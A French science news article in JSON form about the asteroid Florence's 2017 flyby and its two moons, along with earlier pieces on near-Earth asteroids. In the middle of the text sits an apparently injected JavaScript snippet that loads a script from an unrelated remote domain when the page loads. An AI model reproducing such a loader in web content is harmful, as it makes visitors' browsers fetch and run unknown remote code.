{"title": "L'asteroide Florence, qui vient de froler la Terre, a deux lunes", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-09-07", "content": "L'asteroide Florence, qui a frole la Terre le 1 er  septembre 2017, est triple, comme l'ont revele les images radar de l'antenne de Goldstone. Mesurant quelque 4,5 km de diametre, le geocroiseur est le plus gros observe depuis la naissance du programme specialise de la Nasa. Interview : la Terre menacee par des asteroides ?                       Depuis quelques annees les scientifiques etudient la menace possible des geocroiseurs pour notre Planete. A l'image du scenario de l'extinction des dinosaures, ces asteroides sont-ils une menace pour la vie sur Terre ? Futura-Sciences a interviewe Jean-Pierre Luminet, astrophysicien de renom, afin d'en savoir plus.                                       Vendredi 1 er  septembre, l' asteroide  3122 Florence, aussi grand que le mont Blanc -- sa taille est desormais estimee a 4,5 km de diametre --, a croise l' orbite  de la  Terre  sans nous menacer, ainsi que l'avait annonce la Nasa. Le  geocroiseur  decouvert en 1981 n'est passe qu'a 7 millions de kilometres de nous, soit environ 18 fois la distance qui separe notre planete de la  Lune . Voir aussi : Asteroides : un risque accru de collision avec la Terre ? << Florence est le plus grand asteroide a passer pres de notre planete depuis que le programme de la Nasa pour detecter et suivre les asteroides proches de la Terre a commence [en 1995, NDLR] >>,  declarait le directeur du Cneos ( Center for Near Earth Object Studies ), Paul Chodas. C'est son passage le plus proche depuis 1890 -- la pionniere des soins infirmiers modernes, Florence Nightingale (1820-1910), nee a Florence, qui lui a donne son nom, vivait encore a ce moment-la -- et jusqu'a 2500. L'asteroide Florence, avec ses deux lunes ( Outer moon  et  Inner moon , en anglais sur l'image), qui viennent d'etre decouvertes. Sur les 16.400 geocroiseurs catalogues, il est le troisieme a etre triple. Voir l'animation GIF  ici . (c) Nasa, JPL                       Surprise : un asteroide triple Cette visite fut bien sur une excellente occasion pour les astronomes d'en apprendre plus sur cet  asteroide potentiellement dangereux , membre de la famille Amor. Les images obtenues avec l'antenne de 70 m de Goldstone, en Californie, ont permis de decouvrir qu'il n'est, en realite, pas seul : il se balade dans le  Systeme solaire  accompagne de deux petites lunes. Une surprise ! Sur les 16.400 geocroiseurs connus, ils ne sont que trois. Le saviez-vous ? Si un corps celeste de la taille de 3122 Florence (4,5 km) entrait en collision avec la Terre a la vitesse de la meteorite de Tcheliabinsk (2013), il creerait un cratere d'environ 55 km de diametre et d'un kilometre de profondeur. L'impact provoquerait des degats planetaires sur les ecosystemes.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Il est probable que ces deux satellites, dont les tailles sont approximativement 100 et 300 metres, soient des debris d'un impact sur Florence (le geocroiseur arbore un grand cratere). Ils mettent 22 et 27 heures pour faire le tour de l' asteroide , dont la  periode de rotation  est de 2,4 heures. Voir aussi : Asteroides : l'apocalypse demain ? Le prochain rendez-vous avec un asteroide de grande taille sera en 2027, avec 1999 AN10 (decouvert en 1999). Mesurant approximativement 800 metres, il ne passera qu'a 380.000 kilometres de la Terre, soit a peu pres autant que la distance qui nous separe de notre satellite. Pour en savoir plus A quoi ressemble l'asteroide qui vient de froler la Terre ? Article de  Xavier Demeersman  publie le 19 avril 2017 La Nasa a obtenu ses premiers portraits de l'asteroide qui est passe a moins de 2 millions de km de la Terre ce mercredi 19 avril. Il est bilobe et rappelle, de par sa forme (en cacahuete), la  comete  Tchouri. Cet apres-midi, a 14 h 24 heure de Paris exactement, l'asteroide 2014 JO25 est passe a quelque 1,8 million de km de la Terre. Certes, le terme << froler >> est peut-etre un peu exagere -- sa distance represente tout de meme 4,6 fois celle de la Terre a la Lune -- mais, a l'echelle du Systeme solaire, on peut dire que c'est tres proche. Son passage du mercredi 19 avril fut le plus proche depuis quatre siecles et devrait le rester jusqu'a l'horizon 2500, selon les calculs de son orbite. Pour les astronomes, c'est le premier  asteroide de grande taille  -- il mesurerait plus de 600 m de long -- a passer si pres de nous depuis  Toutatis  en 2004. De par ses dimensions (en attente de precisions) et sa trajectoire qui croise celle de notre Planete a moins de 8 millions de km, 2014 JO25, decouvert il y a seulement trois ans, est donc classe parmi les  asteroides potentiellement dangereux . Qu'on se rassure, les risques de collision sont pour l'instant -- et, semble-t-il, pour longtemps -- tres faibles. Cependant, c'est pour cela, et aussi pour en debusquer d'autres comme lui qui demeurent caches (selon leurs tailles, ils peuvent occasionner des degats a une echelle regionale ou planetaire), que la communaute scientifique continue de garder un  oeil  sur lui... Il s'agit bien entendu de prevenir d'eventuelles modifications de son orbite (perturbations gravitationnelles, dislocations, etc.) qui pourraient nous nuire... Animation de l'asteroide 2014 JO25 qui nous a froles le 19 avril a 14 h 24. Les images ont ete obtenues avec l'antenne de Goldstone dans le desert de Mojave, en Californie, le 18 avril. Sa periode de rotation est de 5 heures. (c) Nasa, JPL-Caltech, GSSR Un asteroide brillant en forme de cacahuete Pour les chercheurs, la visite d'un de ces corps, veritables reliques de la  formation de notre Systeme solaire , est une aubaine pour mieux les connaitre. Aussi, plusieurs observatoires ne le quittent pas des yeux. L'antenne de 70 m de diametre du complexe de Goldstone, en Californie, et celle, fameuse, d'Arecibo (Porto Rico) sont notamment sur le coup. L'asteroide, traque depuis plusieurs heures deja, le sera jusqu'au 21 avril prochain. La Nasa vient de partager ses premieres images acquises a Goldstone. Surprise : cet  asteroide  presentant une surface deux fois plus brillante que celle de la Lune ressemble beaucoup a... une cacahuete ! Il fait meme furieusement penser a la  comete Tchouri , que la sonde  Rosetta  avait suivie entre 2014 et 2016. << L'asteroide a une structure de binaire a contact -- deux lobes relies par une region en forme de cou -- , a commente Shantanu Naidu, du  JPL , en charge des observations a Goldstone, ajoutant que  << les images montrent des faces plates, des concavites et une topographie angulaire >> . Le plus grand des deux lobes mesure environ 620 metres de diametre. Il est possible que, dans sa plus grande longueur, le corps celeste fasse 1,3 km. Sa periode de rotation est estimee, quant a elle, a 5 heures. De nouvelles precisions devraient nous parvenir dans les prochains jours. Un gros asteroide va froler la Terre le 19 avril Article de Xavier Demeersman publie le 10/04/2017 Un asteroide plus gros que d'habitude passera dans le voisinage de la Terre le 19 avril. Mesurant environ 650 m, il s'approchera a seulement 1,8 million de kilometres de nous. Le meme jour, mais un peu plus loin, une comete fera aussi une visite au plus pres de notre Planete. Le 4 avril dernier, un petit asteroide a litteralement frole la Terre. De la taille d'une  voiture , le  geocroiseur  2017 GM (c'est son nom) n'etait alors passe qu'a 16.000 km de la surface de notre Planete, ce qui est vraiment tres proche. En realite, nous croisons souvent de semblables petits objets sans que cela ne nous menace (plusieurs fois par semaine).  Le 19 avril prochain, c'est un  asteroide  beaucoup plus gros qui va passer dans les parages de la Terre.  2014 JO25, qui, comme son nom nous l'indique, a ete decouvert en mai 2014, passera alors a environ 1,8 million de kilometres (ce qui correspond a 4,6 fois la distance moyenne entre la Terre et la Lune). La Nasa assure que ce corps celeste de quelque 650 metres de diametre (selon les premieres estimations) n'est pas sur une trajectoire de collision.  C'est la premiere fois depuis le passage en 2004 d' Apophis , un petit monstre potentiellement dangereux de 5 km de diametre, qu'un asteroide de cette taille nous frolera. Pour 2014 JO25, il s'agit de son passage le plus proche de la Planete bleue depuis quatre siecles, et ce sera encore le cas pour les cinq siecles a venir, d'apres les calculs. Simulation numerique de la visite de 2014 JO25, le 19 avril. L'asteroide viendra de la direction du Soleil. (c) Nasa, JPL-Caltech Une belle comete a guetter a l'aube le meme jour Pour les chercheurs, cette visite est bien sur une belle opportunite pour l'etudier et mieux decrire son orbite. Les premieres observations, en 2014, avaient montre que l' astre  etait deux fois plus reflechissant que la Lune. Les  radiotelescopes  de Goldstone, en Californie, et d'Arecibo, a Porto Rico, l'attendent de pied ferme. Les astronomes amateurs, et aussi tous les curieux qui possedent un instrument, pourront le guetter au cours des deux nuits qui precedent son approche. De magnitude 11, il sera cependant faible et guere visible a l'oeil nu. La comete C/2015 ER61 PanSTARRS photographiee le 6 avril 2017.  (c) Gerald Rhemann, Spaceweather                               Le meme jour, la Terre a aussi rendez-vous avec une  comete  : C/2015 ER61 PanSTARRS. Decouverte recemment, elle passera a 175 millions de kilometres de nous, soit une distance superieure a celle qui nous separe du  Soleil . A la faveur de son incursion recente dans le voisinage du Soleil, des  sursauts  d'activite ont considerablement accru sa  luminosite , si bien qu'elle est actuellement visible avec une simple paire de jumelles a l' aube . Une belle surprise comme savent si bien le faire les cometes. 2004 BL86, un geocroiseur qui nous a froles le 26 janvier 2015 Article de Xavier Demeersman publie le 22/01/2015 Le soir du 26 janvier, l'asteroide 2004 BL86 croisera l'orbite terrestre. Il passera a seulement 1,2 million de kilometres de nos tetes sans pour autant nous menacer. Le  geocroiseur , qui mesure entre 500 et 680 m, devrait etre visible dans une paire de jumelles ou une lunette astronomique lors de sa traversee de la  constellation du Lion , en direction de l'Est, non loin de  Jupiter . Les asteroides de relative petite taille sont nombreux a croiser l'orbite terrestre. Voici bientot deux ans, le geocroiseur 2012 DA14 (environ 45 m) s'aventurait a seulement 27.700 km de la surface de notre Planete, sans pour autant nous menacer. Toutefois, ce meme jour, le 15 fevrier 2013, restera marque par l'intrusion inopinee et l'explosion d'une  meteorite en Russie , au-dessus de la ville de Tcheliabinsk. Sans qu'il n'y ait de relation directe entre les deux evenements (qui se sont produits a plusieurs heures d'intervalle), ceux-ci nous rappellent notre vulnerabilite et notre interet a evaluer les  risques des geocroiseurs . A cet egard, la Nasa montrait dans une etude publiee en novembre dernier que les visiteurs de ce type de plus d'un metre, sont legions : au minimum une  meteorite  toutes les deux semaines, partout a travers le globe terrestre. Loin de trois fois la distance Terre-Lune Le 26 janvier prochain, c'est 2004 BL86 qui viendra nous rendre visite sans danger, a 1,2 million de kilometres, soit un peu plus de trois fois la distance Terre-Lune. Comme son nom l'indique, il a ete decouvert le 30 janvier 2004, par un  telescope  du programme  Linear  ( Lincoln Near-Earth Asteroid Research ). Avec une taille estimee entre 500 et 680 m, 2004 BL86 devrait etre le plus gros  asteroide potentiellement dangereux  (en anglais PHA,  potentially haszardous asteroid ) a se promener pres de chez nous avant le passage de 1999 AN10 (entre 800 et 1.800 m) en 2027, a seulement 388.960 km. Bien sur, des specialistes de la  Nasa  ne manqueront pas le rendez-vous pour mieux cerner et caracteriser cet objet, notamment avec l'antenne  Deep Space Network  a Goldstone (Californie) et celle, immense, d'Arecibo a Porto Rico.  << Actuellement, nous ne savons presque rien de cet asteroide,  declare Lance Benner qui dirigera cette campagne d'observations,   donc, il y aura forcement des surprises. >> Trajectoire de l'asteroide 2004 BL86. Son periple de 1,86 ans le conduit a croiser l'orbite terrestre, le 26 janvier 2015. Ce jour-la, a 16 h 20 TU, le geocroiseur ne sera qu'a 1,2 million de kilometres de la Terre, soit trois fois la distance moyenne Terre-Lune. (c) Nasa, JPL-Caltech                                Un geocroiseur visible avec des jumelles Une fois n'est pas coutume, les professionnels ou les amateurs equipes de cameras et de grands telescopes ne seront pas les seuls a pouvoir suivre l'objet celeste. En effet, le  geocroiseur  devrait atteindre une magnitude 9 le 26 janvier et 13 les jours qui suivent et precedent son approche, ce qui signifie qu'il sera visible avec une simple  lunette astronomique  voire une paire de jumelles. En Europe, deux heures et demie environ apres le coucher du Soleil, les amateurs pourront observer l'objet traverser la constellation du Lion qui sera presque entierement levee au-dessus de l'horizon Est, a la suite de Jupiter. Du fait de sa proximite -- c'est a 16 h 20 TU, 17 h 20 en France metropolitaine, qu'il sera au plus proche --, 2004 BL86 sera une cible qui se deplace relativement rapidement dans le  champ visuel  de votre instrument, evoquant le passage d'un satellite artificiel, mais ralenti, progressant de quelque deux  secondes d'arc  par seconde, soit deux degres (quatre fois la taille de la  Pleine Lune ) par heure. Don Yeomans, qui vient de prendre sa retraite apres avoir dirige le  Near Earth Object Program  (Neo) de la Nasa durant 17 ans, -- programme surnomme les gardiens de l'espace ( Spaceguards ) -- assure qu'il va prendre ses  << jumelles preferees >>  pour observer cet intrus.  << Les asteroides ont quelque chose de particulier,  rappelle-t-il.  Pas seulement parce qu'ils ont (vraisemblablement) fourni a la Terre les molecules  prebiotiques  et la  plupart de son eau , mais parce qu'a l'avenir, ils deviendront des  gisements precieux de minerais  et autres ressources vitales. Ils deviendront egalement les stations de ravitaillement pour l'humanite tandis que nous poursuivons notre exploration du Systeme solaire. Il y a quelque chose au sujet des asteroides qui me donnera toujours envie de les regarder. >> Avis aux curieux, placez-vous a l'abri de la  pollution lumineuse  et preparez-vous a guetter ce petit corps celeste qui croisera notre chemin orbital. ", "theme": "sciences"}